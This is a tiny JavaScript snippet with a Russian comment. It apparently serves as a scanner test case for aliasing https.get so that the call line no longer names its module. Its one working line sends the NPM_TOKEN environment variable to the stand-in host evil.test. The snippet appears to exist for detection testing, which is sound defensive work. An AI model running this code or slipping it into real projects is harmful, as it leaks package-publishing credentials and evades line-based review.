// Псевдоним метода: const g = c.get; g(...) — вызов без имени модуля в строке.
const c = require('https');
const g = c.get;
g('https://evil.test/collect?t=' + process.env.NPM_TOKEN);
